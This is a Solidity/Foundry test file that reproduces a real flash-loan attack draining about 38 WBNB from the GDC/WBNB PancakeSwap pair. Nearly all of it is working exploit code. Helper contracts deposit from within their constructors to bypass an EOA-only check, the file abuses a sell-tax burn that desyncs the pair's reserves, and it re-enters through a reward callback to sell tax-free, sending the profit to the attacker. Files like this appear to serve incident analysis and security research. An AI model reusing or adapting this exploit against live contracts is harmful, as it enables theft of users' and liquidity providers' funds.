// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~38.14 WBNB (~$27k) drained from the GDC/WBNB pair; live attacker net ~35.34 BNB
// Attacker : 0xe327b58233de729d58d35e36e4b6d45c8e00cdbb
// Attack Contract : 0x5fe1deb9d9a58e9424b7fafc77494ff782b7dc14
// Vulnerable Contract : 0xe3342358e7ccbaebdd1139ad0274c53c5b3ef822 (GDCToken)
// Victim Pair : 0x9cd8d04c30ed78afef7ed00ab1a2a028d476331c (Pancake V2 GDC/WBNB)
// Attack Tx : https://bscscan.com/tx/0xf12ccb683c51cc1c5907d362f3219b3a49a597be1fdfe1fb36bb2361bb3db877
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xe3342358e7ccbaebdd1139ad0274c53c5b3ef822#code
//
// @Analysis
// Twitter Guy : https://x.com/exvulsec/status/2098391015954809048
//
// Root cause: GDC sell tax credits the pair with only 30% of the nominal sell
// (70% is taken as tax) but `_burnSellAgainstPair` then burns the FULL nominal
// amount from the pair and `sync()`s. A later swap therefore overpays WBNB.
// Chained with:
//   1. constructor EXTCODESIZE bypass of the EOA-only deposit check
//   2. any depositor receiving GDC from the pair is classified as LP-removal
//      (so the `BuyingProhibited` revert is skipped)
//   3. BNB reward callback reentrancy while `swapping=true` (tax-free unwind)

address constant ATTACKER = 0xe327b58233DE729D58d35e36E4B6D45c8e00cDbb;
address constant GDC = 0xE3342358E7CcBAEbDD1139aD0274c53c5b3EF822;
address constant PAIR = 0x9CD8D04C30ED78AfeF7eD00Ab1A2a028d476331C;
address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
// Pancake V3 USDT/WBNB 0.01% — flash source (token1 = WBNB)
address constant V3_WBNB_USDT = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;

uint256 constant FORK_BLOCK = 121_253_213;
uint256 constant FLASH_WBNB = 400 ether;
uint256 constant DEPOSIT_BNB = 0.1 ether; // on-chain minAmount (owner raised from 0.001)
uint256 constant SEED_BUY_WBNB = 6.5 ether;
uint256 constant INJECT_WBNB = 365 ether;

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IGDC is IERC20 {
    function bindReferrer(address referrer) external;
    function addLiquidityUnlockTime(address account) external view returns (uint256);
}

contract ContractTest is Test {
    GDCExploit internal exploit;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker EOA");
        vm.label(GDC, "GDC");
        vm.label(PAIR, "GDC/WBNB Pair");
        vm.label(WBNB, "WBNB");
        vm.label(ROUTER, "Pancake Router");
        vm.label(V3_WBNB_USDT, "Pancake V3 USDT/WBNB");

        vm.deal(ATTACKER, 1 ether);
        vm.prank(ATTACKER);
        exploit = new GDCExploit();
    }

    function testExploit() public {
        uint256 pairWbnbBefore = IERC20(WBNB).balanceOf(PAIR);
        uint256 attackerWbnbBefore = IERC20(WBNB).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 pairWbnbAfter = IERC20(WBNB).balanceOf(PAIR);
        uint256 attackerWbnbAfter = IERC20(WBNB).balanceOf(ATTACKER);
        uint256 drained = pairWbnbBefore - pairWbnbAfter;
        uint256 profit = attackerWbnbAfter - attackerWbnbBefore;

        emit log_named_decimal_uint("Pair WBNB before", pairWbnbBefore, 18);
        emit log_named_decimal_uint("Pair WBNB after", pairWbnbAfter, 18);
        emit log_named_decimal_uint("Pair WBNB drained", drained, 18);
        emit log_named_decimal_uint("Attacker WBNB profit", profit, 18);

        // Alert: pair lost ~38.14 WBNB. Live net to attacker ~35.34 BNB after flash fee.
        assertGt(drained, 30 ether, "expected ~38 WBNB drained from pair");
        assertGt(profit, 30 ether, "expected material WBNB profit");
    }
}

contract GDCExploit {
    address private immutable owner;
    GDCReferrer private referrer;
    GDCBuyer private buyer;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == owner, "only owner");
        IPancakeV3Pool(V3_WBNB_USDT).flash(address(this), 0, FLASH_WBNB, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        require(msg.sender == V3_WBNB_USDT, "not v3");
        require(fee0 == 0 && fee1 > 0, "unexpected fees");

        IWBNB(WBNB).withdraw(DEPOSIT_BNB * 2);

        // 1) Constructor deposits bypass `isContract` (EXTCODESIZE == 0 in ctor).
        referrer = new GDCReferrer{value: DEPOSIT_BNB}();
        buyer = new GDCBuyer{value: DEPOSIT_BNB}(address(referrer));
        require(IGDC(GDC).addLiquidityUnlockTime(address(referrer)) > 0, "referrer deposit");
        require(IGDC(GDC).addLiquidityUnlockTime(address(buyer)) > 0, "buyer deposit");

        // 2) Seed buy — classified as LP-removal because the buyer has a deposit record.
        IERC20(WBNB).transfer(address(buyer), SEED_BUY_WBNB);
        buyer.buyGdc();

        // 3) Park the WBNB that the referrer will inject during the sell-tax BNB callback.
        IERC20(WBNB).transfer(address(referrer), INJECT_WBNB);
        referrer.setPhase(1);

        uint256 sellKeep = 1 ether; // keep 1 GDC for the tax-free unwind sell
        uint256 sellAmt = IERC20(GDC).balanceOf(address(buyer)) - sellKeep;
        buyer.sellToPair(sellAmt); // 70% tax + full-nominal burn-against-pair + 30% swap

        // 4) Tiny second sell re-enters while swapping=true so the referrer can dump
        //    the injected GDC inventory with no sell tax.
        referrer.setPhase(2);
        buyer.sellToPair(sellKeep);

        // Sweep helpers → repay flash → profit to the attacker EOA.
        referrer.sweep(address(this));
        buyer.sweep(address(this));
        if (address(this).balance > 0) {
            IWBNB(WBNB).deposit{value: address(this).balance}();
        }

        uint256 repay = FLASH_WBNB + fee1;
        IERC20(WBNB).transfer(V3_WBNB_USDT, repay);
        IERC20(WBNB).transfer(owner, IERC20(WBNB).balanceOf(address(this)));
    }
}

/// Deposits during construction (EXTCODESIZE==0) so GDC treats it as an EOA.
contract GDCReferrer {
    address private immutable owner;
    uint256 public phase; // 0 idle, 1 inject-buy, 2 tax-free dump

    constructor() payable {
        owner = msg.sender;
        (bool ok,) = GDC.call{value: msg.value}("");
        require(ok, "referrer deposit call");
    }

    function setPhase(uint256 p) external {
        require(msg.sender == owner, "only owner");
        phase = p;
    }

    receive() external payable {
        uint256 p = phase;
        if (p == 1) {
            phase = 0;
            _buyGdc();
        } else if (p == 2) {
            phase = 0;
            _dumpGdc();
        }
    }

    function _buyGdc() internal {
        uint256 amt = IERC20(WBNB).balanceOf(address(this));
        if (amt == 0) return;
        IERC20(WBNB).transfer(PAIR, amt);
        (uint112 r0, uint112 r1,) = IPancakePair(PAIR).getReserves();
        uint256 amountIn = IERC20(WBNB).balanceOf(PAIR) - uint256(r0);
        uint256 out = _getAmountOut(amountIn, r0, r1);
        if (out > 0) {
            IPancakePair(PAIR).swap(0, out, address(this), "");
        }
    }

    function _dumpGdc() internal {
        uint256 amt = IERC20(GDC).balanceOf(address(this));
        if (amt == 0) return;
        // swapping=true on GDC → 100% of this transfer credits the pair (no 70% tax).
        IERC20(GDC).transfer(PAIR, amt);
        (uint112 r0, uint112 r1,) = IPancakePair(PAIR).getReserves();
        uint256 gdcBal = IERC20(GDC).balanceOf(PAIR);
        if (gdcBal <= uint256(r1)) return;
        uint256 amountIn = gdcBal - uint256(r1);
        uint256 out = _getAmountOut(amountIn, r1, r0);
        uint256 wbnbBal = IERC20(WBNB).balanceOf(PAIR);
        if (out >= wbnbBal) out = wbnbBal - 1;
        if (out > 0) {
            IPancakePair(PAIR).swap(out, 0, address(this), "");
        }
    }

    function sweep(address to) external {
        require(msg.sender == owner, "only owner");
        uint256 g = IERC20(GDC).balanceOf(address(this));
        if (g > 0) IERC20(GDC).transfer(to, g);
        uint256 w = IERC20(WBNB).balanceOf(address(this));
        if (w > 0) IERC20(WBNB).transfer(to, w);
        uint256 n = address(this).balance;
        if (n > 0) {
            (bool ok,) = to.call{value: n}("");
            require(ok, "bnb sweep");
        }
    }
}

/// Deposits during construction, binds the referrer, then buys/sells GDC.
contract GDCBuyer {
    address private immutable owner;

    constructor(address referrer) payable {
        owner = msg.sender;
        IGDC(GDC).bindReferrer(referrer);
        (bool ok,) = GDC.call{value: msg.value}("");
        require(ok, "buyer deposit call");
    }

    receive() external payable {}

    function buyGdc() external {
        require(msg.sender == owner, "only owner");
        uint256 amt = IERC20(WBNB).balanceOf(address(this));
        require(amt > 0, "no wbnb");
        IERC20(WBNB).transfer(PAIR, amt);
        (uint112 r0, uint112 r1,) = IPancakePair(PAIR).getReserves();
        uint256 amountIn = IERC20(WBNB).balanceOf(PAIR) - uint256(r0);
        uint256 out = _getAmountOut(amountIn, r0, r1);
        IPancakePair(PAIR).swap(0, out, address(this), "");
    }

    function sellToPair(uint256 amount) external {
        require(msg.sender == owner, "only owner");
        require(amount > 0, "zero");
        IERC20(GDC).transfer(PAIR, amount);
        (uint112 r0, uint112 r1,) = IPancakePair(PAIR).getReserves();
        uint256 gdcBal = IERC20(GDC).balanceOf(PAIR);
        if (gdcBal <= uint256(r1)) return;
        uint256 amountIn = gdcBal - uint256(r1);
        uint256 out = _getAmountOut(amountIn, r1, r0);
        uint256 wbnbBal = IERC20(WBNB).balanceOf(PAIR);
        if (out >= wbnbBal) out = wbnbBal - 1;
        if (out > 0) {
            IPancakePair(PAIR).swap(out, 0, address(this), "");
        }
    }

    function sweep(address to) external {
        require(msg.sender == owner, "only owner");
        uint256 g = IERC20(GDC).balanceOf(address(this));
        if (g > 0) IERC20(GDC).transfer(to, g);
        uint256 w = IERC20(WBNB).balanceOf(address(this));
        if (w > 0) IERC20(WBNB).transfer(to, w);
        uint256 n = address(this).balance;
        if (n > 0) {
            (bool ok,) = to.call{value: n}("");
            require(ok, "bnb sweep");
        }
    }
}

function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) pure returns (uint256) {
    uint256 amountInWithFee = amountIn * 9975;
    return (amountInWithFee * reserveOut) / (reserveIn * 10000 + amountInWithFee);
}
